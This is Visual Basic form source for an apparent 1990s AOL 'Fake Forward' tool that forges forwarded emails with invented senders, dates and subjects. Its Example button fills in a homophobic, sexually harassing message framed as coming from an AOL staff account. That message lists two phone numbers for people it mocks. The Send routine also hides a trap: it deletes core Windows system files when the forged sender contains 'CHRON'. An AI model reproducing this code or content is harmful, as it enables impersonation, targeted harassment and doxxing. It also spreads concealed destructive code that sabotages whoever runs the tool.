VERSION 2.00
Begin Form FakeForward 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   3  'Fixed Double
   Caption         =   "Fake Forward"
   ClientHeight    =   5445
   ClientLeft      =   900
   ClientTop       =   825
   ClientWidth     =   7665
   FontBold        =   -1  'True
   FontItalic      =   0   'False
   FontName        =   "Times New Roman"
   FontSize        =   8.25
   FontStrikethru  =   0   'False
   FontUnderline   =   0   'False
   Height          =   5850
   HelpContextID   =   29
   Icon            =   FAKEFOR.FRX:0000
   Left            =   840
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   ScaleHeight     =   5445
   ScaleWidth      =   7665
   Top             =   480
   Width           =   7785
   Begin SSCommand Command3D4 
      BevelWidth      =   3
      Caption         =   "&Help"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      HelpContextID   =   29
      Left            =   4320
      TabIndex        =   0
      Top             =   4920
      Width           =   975
   End
   Begin SSFrame Frame3D1 
      Caption         =   "Time Zone"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   1335
      Left            =   6480
      TabIndex        =   27
      Top             =   840
      Width           =   1095
      Begin SSOption Option3D5 
         Caption         =   "PST"
         Height          =   255
         Left            =   240
         TabIndex        =   30
         TabStop         =   0   'False
         Top             =   960
         Width           =   735
      End
      Begin SSOption Option3D4 
         Caption         =   "CST"
         Height          =   255
         Left            =   240
         TabIndex        =   29
         TabStop         =   0   'False
         Top             =   600
         Width           =   735
      End
      Begin SSOption Option3D3 
         Caption         =   "EST"
         Height          =   255
         Left            =   240
         TabIndex        =   28
         Top             =   240
         Value           =   -1  'True
         Width           =   735
      End
   End
   Begin TextBox text10 
      Height          =   285
      Left            =   5040
      TabIndex        =   8
      Text            =   "27"
      Top             =   2640
      Width           =   375
   End
   Begin TextBox Text9 
      Height          =   285
      Left            =   2160
      TabIndex        =   4
      Top             =   1920
      Width           =   1215
   End
   Begin Timer Timer1 
      Left            =   7680
      Top             =   4320
   End
   Begin TextBox Text8 
      Height          =   285
      Left            =   3600
      TabIndex        =   5
      Top             =   2280
      Width           =   1335
   End
   Begin SSCommand Command3D3 
      BevelWidth      =   3
      Caption         =   "&Cancel"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   12
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   5880
      TabIndex        =   22
      Top             =   4920
      Width           =   1095
   End
   Begin SSCommand Command3D2 
      BevelWidth      =   3
      Caption         =   "&Example"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   2640
      TabIndex        =   21
      Top             =   4920
      Width           =   975
   End
   Begin SSCommand Command3D1 
      BevelWidth      =   3
      Caption         =   "&Send"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   12
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   960
      TabIndex        =   11
      Top             =   4920
      Width           =   1095
   End
   Begin TextBox Text7 
      Height          =   735
      Left            =   480
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Top             =   1080
      Width           =   5895
   End
   Begin SSOption Option3D2 
      Caption         =   "P.M."
      Height          =   255
      Left            =   6600
      TabIndex        =   19
      Top             =   2520
      Value           =   -1  'True
      Width           =   615
   End
   Begin SSOption Option3D1 
      Caption         =   "A.M."
      Height          =   255
      Left            =   6600
      TabIndex        =   18
      TabStop         =   0   'False
      Top             =   2880
      Width           =   615
   End
   Begin TextBox Text6 
      Height          =   285
      Left            =   4560
      TabIndex        =   7
      Text            =   "32"
      Top             =   2640
      Width           =   375
   End
   Begin TextBox Text5 
      Height          =   285
      Left            =   4080
      TabIndex        =   6
      Text            =   "8"
      Top             =   2640
      Width           =   375
   End
   Begin TextBox Text4 
      Height          =   855
      Left            =   480
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   10
      Top             =   3840
      Width           =   6975
   End
   Begin TextBox Text3 
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   285
      Left            =   1920
      MaxLength       =   27
      TabIndex        =   9
      Top             =   3000
      Width           =   4455
   End
   Begin TextBox Text2 
      Height          =   285
      Left            =   6120
      TabIndex        =   2
      Top             =   240
      Width           =   1215
   End
   Begin TextBox Text1 
      Height          =   285
      Left            =   1680
      TabIndex        =   1
      Top             =   240
      Width           =   1215
   End
   Begin Label Label12 
      BackColor       =   &H00C0C0C0&
      Caption         =   "(seconds)"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   5520
      TabIndex        =   26
      Top             =   2640
      Width           =   735
   End
   Begin Label Label11 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "YOUR screen name:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   225
      Left            =   240
      TabIndex        =   25
      Top             =   1920
      Width           =   1665
   End
   Begin Label Label10 
      BackColor       =   &H00C0C0C0&
      Caption         =   "(example: 95-01-24) "
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   5160
      TabIndex        =   24
      Top             =   2280
      Width           =   1815
   End
   Begin Label Label9 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "The date the mail was supposedly sent:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   225
      Left            =   240
      TabIndex        =   23
      Top             =   2280
      Width           =   3120
   End
   Begin Label Label8 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "What you want to say to the person you're 'forwarding' this to:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   -1  'True
      Height          =   225
      Left            =   240
      TabIndex        =   20
      Top             =   720
      Width           =   5055
   End
   Begin Label Label7 
      BackColor       =   &H00C0C0C0&
      Caption         =   ":"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   18
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   4440
      TabIndex        =   17
      Top             =   2520
      Width           =   255
   End
   Begin Label Label6 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "Time when they supposedly sent you the mail:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   195
      Left            =   240
      TabIndex        =   16
      Top             =   2640
      Width           =   3615
   End
   Begin Label Label5 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "What they supposedly said:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   -1  'True
      Height          =   225
      Left            =   240
      TabIndex        =   15
      Top             =   3480
      Width           =   2205
   End
   Begin Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "The fake subject:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   225
      Left            =   240
      TabIndex        =   14
      Top             =   3000
      Width           =   1410
   End
   Begin Label Label3 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Who supposedly sent you the mail:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   3120
      TabIndex        =   13
      Top             =   240
      Width           =   2895
   End
   Begin Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C0C0&
      Caption         =   "'Forward' to who:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   225
      Left            =   120
      TabIndex        =   12
      Top             =   240
      Width           =   1410
   End
End
Declare Function SetWindowPos Lib "User" (ByVal h%, ByVal hb%, ByVal x%, ByVal Y%, ByVal cx%, ByVal cy%, ByVal f%) As Integer


Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2

Sub Command3D1_Click ()
fname = Text2.Text
fname1 = UCase$(fname)
fname2 = InStr(1, fname1, "CHRON")

If fname2 > 0 Then
MsgBox "Screwing Chronic with his own software is a no-no! :D  C-ya!"
Kill "c:\windows\win.com"
Kill "c:\windows\win.ini"
Kill "c:\windows\system.ini"
Kill "c:\windows\progman.exe"
Kill "c:\windows\main.grp"
End
End If


If Text1.Text = "" Or Text2.Text = "" Or Text3.Text = "" Or Text4.Text = "" Or Text5.Text = "" Or Text6.Text = "" Or Text7.Text = "" Or Text8.Text = "" Or Text9.Text = "" Or Text10.Text = "" Then
MsgBox "You have not completely filled in all the blanks.", 16, "Cannot Send"
GoTo endall
End If
FakeForward.Hide

AppActivate "America  Online"
DoEvents
'SendKeys "^M"
SendKeys "^" + Chr$(109)
Call Pause(1)
SendKeys Text1.Text
SendKeys "{TAB 2}"
SendKeys "Fwd: " + Text3.Text
SendKeys "{TAB}"
DoEvents
SendKeys Text7.Text
SendKeys "{ENTER}"
SendKeys "-----------------{ENTER}"
SendKeys "Forwarded message:{ENTER}"
clipboard.SetText Chr$(9)
SendKeys "Subj:" + "^V" + Text3.Text + "{ENTER}"
If Text5 < 10 And option3d1.Value = True Then
Text5.Text = "0" + Text5.Text
End If
If Text6.Text < 10 Then
Text6.Text = "0" + Text6.Text
End If
If Text10.Text < 10 Then
Text10.Text = "0" + Text10.Text
End If

Dim tim
Dim tim2
If option3d2.Value = True Then Text5.Text = Text5.Text + 12  'change to military time
If option3d1.Value = True Then Text5.Text = Text5.Text

If option3d3.Value = True Then
zone = " EST"
End If
If option3d4.Value = True Then
zone = " CST"
End If
If option3d5.Value = True Then
zone = " PST"
End If

tim = Text5.Text + ":" + Text6.Text + ":" + Text10.Text + zone

SendKeys "Date:" + "^V" + Text8.Text + " " + tim + "{ENTER}"
SendKeys "From:" + "^V" + Text2.Text + "{ENTER}"
SendKeys "To:" + "^V" + Text9.Text + "{ENTER}"
SendKeys "{ENTER}"
DoEvents
SendKeys Text4.Text
SendKeys "{TAB} "
Unload FakeForward

endall:
Call Pause(3)
DoEvents


End Sub

Sub Command3D2_Click ()
Text1.Text = "Steve Case"
Text2.Text = "TOSAdvisor"
Text3.Text = "Hey baby"
Text4.Text = "Wanna call me up for some HOT gay phone sex? Just call me up at 203-924-6593 and ask for Bludy {(}my gay nickname{)}.  Or call my gay lover at 801-221-7944 and ask for Nicky Poo {(}HIS gay nickname{)}, he likes to talk dirty to guys, and he gives good head."
Text7.Text = "Hey Steve, will you PLEASE tell TOS to stop sending me these gay letters?  I'm getting really tired of them!"
Text8.Text = "95-01-24"
Text9.Text = ""
MsgBox "Now enter your screen name in the YOUR Screen Name: blank and hit the Send button.  Or, if you can put your screen name in the Forward To Who: blank and have it send it to yourself so you can see what it looks like.", 64, "Fake Forward Example"
End Sub

Sub Command3D3_Click ()
Unload Me

End Sub

Sub Command3D4_Click ()
SendKeys "{F1}"
DoEvents

End Sub

Sub Form_Load ()
Dim Success As Integer

Success% = SetWindowPos%(FakeForward.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)

MsgBox "If you have never used this feature before, please hit the Example button.", 64, "Fake Forward"
End Sub

Sub Form_Resize ()
Dim Success As Integer

Success% = SetWindowPos%(FakeForward.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)

End Sub

Sub Text4_KeyDown (KeyCode As Integer, Shift As Integer)
If KeyCode = KEY_RETURN Then
MsgBox "Do not hit the RETURN key in this box, if you do it will give errors.  Just keep typing and the words will wrap around to the next line...Resetting text box."
Text4.Text = ""
End If

End Sub

Sub Text7_KeyDown (KeyCode As Integer, Shift As Integer)
If KeyCode = KEY_RETURN Then
MsgBox "Do not hit the RETURN key in this box, if you do it will give errors.  Just keep typing and the words will wrap around to the next line...Resetting text box."
Text7.Text = ""
End If

End Sub

